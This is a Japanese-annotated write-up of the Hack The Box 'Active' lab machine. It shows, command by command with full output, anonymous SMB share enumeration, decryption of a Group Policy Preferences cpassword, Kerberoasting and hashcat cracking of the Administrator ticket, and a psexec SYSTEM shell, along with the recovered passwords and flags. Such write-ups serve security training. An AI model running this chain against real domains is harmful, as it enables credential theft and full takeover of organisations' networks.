https://app.hackthebox.com/machines/Active

## STEP 1
```sh
└─$ rustscan -a 10.129.246.135 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.246.135:53
Open 10.129.246.135:88
Open 10.129.246.135:139
Open 10.129.246.135:135
Open 10.129.246.135:464
Open 10.129.246.135:445
Open 10.129.246.135:389
Open 10.129.246.135:593
Open 10.129.246.135:636
Open 10.129.246.135:3268
Open 10.129.246.135:3269
Open 10.129.246.135:5722
Open 10.129.246.135:49152
Open 10.129.246.135:49154
Open 10.129.246.135:49153
Open 10.129.246.135:49155
Open 10.129.246.135:49157
Open 10.129.246.135:49158
Open 10.129.246.135:49162
Open 10.129.246.135:49167
Open 10.129.246.135:49169
10.129.246.135 -> [53,88,139,135,464,445,389,593,636,3268,3269,5722,49152,49154,49153,49155,49157,49158,49162,49167,49169]
```


## STEP 2
クレデンシャルなしでReadできるReplicationを発見
```sh
└─$ netexec smb 10.129.246.135 -u '' -p '' --shares
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\: 
SMB         10.129.246.135  445    DC               [*] Enumerated shares
SMB         10.129.246.135  445    DC               Share           Permissions     Remark
SMB         10.129.246.135  445    DC               -----           -----------     ------
SMB         10.129.246.135  445    DC               ADMIN$                          Remote Admin
SMB         10.129.246.135  445    DC               C$                              Default share
SMB         10.129.246.135  445    DC               IPC$                            Remote IPC
SMB         10.129.246.135  445    DC               NETLOGON                        Logon server share 
SMB         10.129.246.135  445    DC               Replication     READ            
SMB         10.129.246.135  445    DC               SYSVOL                          Logon server share 
SMB         10.129.246.135  445    DC               Users                           
```
Replication配下を再帰で探索
```sh
└─$ netexec smb 10.129.246.135 -u '' -p '' --share 'Replication' -M spider_plus
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.246.135  445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.246.135  445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.246.135  445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.246.135  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.246.135  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.246.135  445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.246.135  445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.246.135  445    DC               [*] Enumerated shares
SMB         10.129.246.135  445    DC               Share           Permissions     Remark
SMB         10.129.246.135  445    DC               -----           -----------     ------
SMB         10.129.246.135  445    DC               ADMIN$                          Remote Admin
SMB         10.129.246.135  445    DC               C$                              Default share
SMB         10.129.246.135  445    DC               IPC$                            Remote IPC
SMB         10.129.246.135  445    DC               NETLOGON                        Logon server share 
SMB         10.129.246.135  445    DC               Replication     READ            
SMB         10.129.246.135  445    DC               SYSVOL                          Logon server share 
SMB         10.129.246.135  445    DC               Users                           
SPIDER_PLUS 10.129.246.135  445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.246.135.json".
SPIDER_PLUS 10.129.246.135  445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.246.135  445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.246.135  445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.246.135  445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.246.135  445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.246.135  445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.246.135  445    DC               [*] File size max:        3.63 KB
                                                                                                                                                                                                                                            
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.246.135.json
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "23 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "119 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "533 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "22 B"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "3.63 KB"
        }
    }
}
```
`Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`を発見・ダウンロード  
このXMLはGPP（グループポリシー基本設定）のデータっぽい
```sh
└─$ netexec smb 10.129.246.135 -u '' -p '' --share 'Replication' --get-file 'active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml' '/home/kali/Groups.xml' 
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\: 
SMB         10.129.246.135  445    DC               [*] Copying "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" to "/home/kali/Groups.xml"
SMB         10.129.246.135  445    DC               [+] File "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" was downloaded to "/home/kali/Groups.xml"
```
[MS14-025](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)という脆弱性があり、以前GPPにユーザとAESで暗号化されたパスワードが含まれていた
```sh
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
[AESの鍵](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)がmicrosortで公開されており、`gpp-decrypt`でクラックできる  
active.htb\SVC_TGS のパスワードは GPPstillStandingStrong2k18
```sh
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
GPPstillStandingStrong2k18
```


## STEP 3
SVC_TGSではUsersフォルダがReadできるようになった
```sh
└─$ netexec smb 10.129.246.135 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares 
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.246.135  445    DC               [*] Enumerated shares
SMB         10.129.246.135  445    DC               Share           Permissions     Remark
SMB         10.129.246.135  445    DC               -----           -----------     ------
SMB         10.129.246.135  445    DC               ADMIN$                          Remote Admin
SMB         10.129.246.135  445    DC               C$                              Default share
SMB         10.129.246.135  445    DC               IPC$                            Remote IPC
SMB         10.129.246.135  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.246.135  445    DC               Replication     READ            
SMB         10.129.246.135  445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.246.135  445    DC               Users           READ
```
ユーザフラグゲット！
```sh
└─$ netexec smb 10.129.246.135 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --share 'Users' --get-file 'SVC_TGS/Desktop/user.txt' '/home/kali/user.txt'
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.246.135  445    DC               [*] Copying "SVC_TGS/Desktop/user.txt" to "/home/kali/user.txt"
SMB         10.129.246.135  445    DC               [+] File "SVC_TGS/Desktop/user.txt" was downloaded to "/home/kali/user.txt"

└─$ cat user.txt  
b603b6e3a31eb7b6e675b760cb537559
```


## STEP 4
`kerberoasting`でSPNが設定されているadministratorのTGSチケットを取得することができた
```sh
└─$ sudo ntpdate 10.129.246.135
2025-07-29 00:54:25.225287 (-0400) +41561.938152 +/- 0.189974 10.129.172.255 s1 no-leap
CLOCK: time stepped by 41561.938152

└─$ netexec ldap 10.129.246.135 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --kdcHost '10.129.246.135' --kerberoasting kerberoast.txt
LDAP        10.129.246.135  389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP        10.129.246.135  389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.246.135  389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.246.135  389    DC               [*] Total of records returned 1
LDAP        10.129.246.135  389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2025-07-27 23:06:20.275344
LDAP        10.129.246.135  389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$cefbeca81ed71a21bbd4c087f79a777d$a05312107054b05348c629632b957882ffe7acc9257680e8f063450eedd5308e6ff2918b04a182f02dad8fa7042e5106f7f64b0541816bdf12fba6646f184903ad9a90c8685ab216ea5a7716c7413a8d86ce4e2fcad9a8853434593944be20806400b35540d6f2703f7f6e005f8c731f16e77dccf5ab24ef4c51cc8971f716221d9fe601ee39389a0d7da57c7644a62e75fc799ba35f9597ea6d3d73df1df67619e4b3a74f64f8a670eeb4e939db1775d0d568cae93c6f19d3ecceae6d8faa991d19f645ee35a767a1468dc8ac5710daa981bc218f4b3b26dd138f64d34cc507cbf9379d70e3be32953fc9b950fb561002e7ae2178fa56662ad784b345258fd6167b1d8f5df6c286e32e822b68dfede76d206d80d7b13fba5136b9bdc6f8a011d61d63593e2794bed0c8915cd174d4c41fca65896049ded325dfeb07c07f2dd6ad0a1752b8511db8cdf5b1b96aee6010100d6d79d34f1e54a48e35608274cf157688ffddb66cdc352e037c89c331f123d0587312d44d2f1e9feefd0024355051d413db57eb863ad6a917cb594f947502f69cd0bf076ce71c6be1dcf4379a11cf1edf9565c79f931284f23575086a1d2abc131a8d723da02c3fd1d53e27e7789b7b2525fac2745be87f8315e1c8cea9d2598c84aa8d170f6a4d2f6a5ecaf14da52f0aff827adbc1429ef60cb939cc38a3ed2bb306f1e88a20ba93dc3003eff29d1cc98c684d2ad246784629fa8e0d6600ab8a9d2cf9b516162e9f85b44532d0e218bed3867a04ced98ea7e92c3aab43b7f61bdae63dd0d365435759a9e0707fe28719403cdbd7fd7aaf89a65455636cb7a3090aee86cbf4836cedc6fd5f93784bc8ed4add972cad4da58876eb3ea6aa6f0740f3e504a046578f57a0328d9b989a7fe16b0310eaab7d53cb2596f44c96b153d2ea3c0472af8ccf87a7b3896171bca1041a79ec23011c2aa854d15bbd4616e6997d07008bc4413ab2915a52878b8aa561f638dbcad8434b6abc76801a388f380ddcdaec014c86fa1be535b81dfa69a7692cead6502b52a68fbfe5d779889b89aab14c11c1d0ba5f58029c08f17ebaa0669f62093de18c05b1ebb1ad31d34e1264905a43f9d426218e1aad331f9f430150a0d13e9467a5f9461fa9fcfc91f683413ac927aac657cc6dfdb4a5ec61f811b3a93049035d62f3f43306730b97ce920af9ee3ef532b3725be8886a13f4792502a27be4958b8ff1269d74f5bc09953d790b94ce3e0ec90074
```
`hashcat`でクラック成功！  
administratorのパスワードは Ticketmaster1968
```sh
└─$ hashcat -a 0 -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --quiet
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$cefbeca81ed71a21bbd4c087f79a777d$a05312107054b05348c629632b957882ffe7acc9257680e8f063450eedd5308e6ff2918b04a182f02dad8fa7042e5106f7f64b0541816bdf12fba6646f184903ad9a90c8685ab216ea5a7716c7413a8d86ce4e2fcad9a8853434593944be20806400b35540d6f2703f7f6e005f8c731f16e77dccf5ab24ef4c51cc8971f716221d9fe601ee39389a0d7da57c7644a62e75fc799ba35f9597ea6d3d73df1df67619e4b3a74f64f8a670eeb4e939db1775d0d568cae93c6f19d3ecceae6d8faa991d19f645ee35a767a1468dc8ac5710daa981bc218f4b3b26dd138f64d34cc507cbf9379d70e3be32953fc9b950fb561002e7ae2178fa56662ad784b345258fd6167b1d8f5df6c286e32e822b68dfede76d206d80d7b13fba5136b9bdc6f8a011d61d63593e2794bed0c8915cd174d4c41fca65896049ded325dfeb07c07f2dd6ad0a1752b8511db8cdf5b1b96aee6010100d6d79d34f1e54a48e35608274cf157688ffddb66cdc352e037c89c331f123d0587312d44d2f1e9feefd0024355051d413db57eb863ad6a917cb594f947502f69cd0bf076ce71c6be1dcf4379a11cf1edf9565c79f931284f23575086a1d2abc131a8d723da02c3fd1d53e27e7789b7b2525fac2745be87f8315e1c8cea9d2598c84aa8d170f6a4d2f6a5ecaf14da52f0aff827adbc1429ef60cb939cc38a3ed2bb306f1e88a20ba93dc3003eff29d1cc98c684d2ad246784629fa8e0d6600ab8a9d2cf9b516162e9f85b44532d0e218bed3867a04ced98ea7e92c3aab43b7f61bdae63dd0d365435759a9e0707fe28719403cdbd7fd7aaf89a65455636cb7a3090aee86cbf4836cedc6fd5f93784bc8ed4add972cad4da58876eb3ea6aa6f0740f3e504a046578f57a0328d9b989a7fe16b0310eaab7d53cb2596f44c96b153d2ea3c0472af8ccf87a7b3896171bca1041a79ec23011c2aa854d15bbd4616e6997d07008bc4413ab2915a52878b8aa561f638dbcad8434b6abc76801a388f380ddcdaec014c86fa1be535b81dfa69a7692cead6502b52a68fbfe5d779889b89aab14c11c1d0ba5f58029c08f17ebaa0669f62093de18c05b1ebb1ad31d34e1264905a43f9d426218e1aad331f9f430150a0d13e9467a5f9461fa9fcfc91f683413ac927aac657cc6dfdb4a5ec61f811b3a93049035d62f3f43306730b97ce920af9ee3ef532b3725be8886a13f4792502a27be4958b8ff1269d74f5bc09953d790b94ce3e0ec90074:Ticketmaster1968

```
administrator権限で列挙
```sh
└─$ netexec smb 10.129.246.135 -u 'active.htb\administrator' -p 'Ticketmaster1968' --shares
SMB         10.129.246.135  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.246.135  445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.129.246.135  445    DC               [*] Enumerated shares
SMB         10.129.246.135  445    DC               Share           Permissions     Remark
SMB         10.129.246.135  445    DC               -----           -----------     ------
SMB         10.129.246.135  445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.129.246.135  445    DC               C$              READ,WRITE      Default share
SMB         10.129.246.135  445    DC               IPC$                            Remote IPC
SMB         10.129.246.135  445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         10.129.246.135  445    DC               Replication     READ            
SMB         10.129.246.135  445    DC               SYSVOL          READ,WRITE      Logon server share 
SMB         10.129.246.135  445    DC               Users           READ            
```
smbでルートフラグを直接参照してもいいが、`ADMIN$`が読み書き権限があるのでpsexecで侵入してルートフラグゲット
```sh
└─$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.129.246.135
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.246.135.....
[*] Found writable share ADMIN$
[*] Uploading file nvUhGEMd.exe
[*] Opening SVCManager on 10.129.246.135.....
[*] Creating service wrNJ on 10.129.246.135.....
[*] Starting service wrNJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
24da85b6531d2a84546ddd908981316c
```
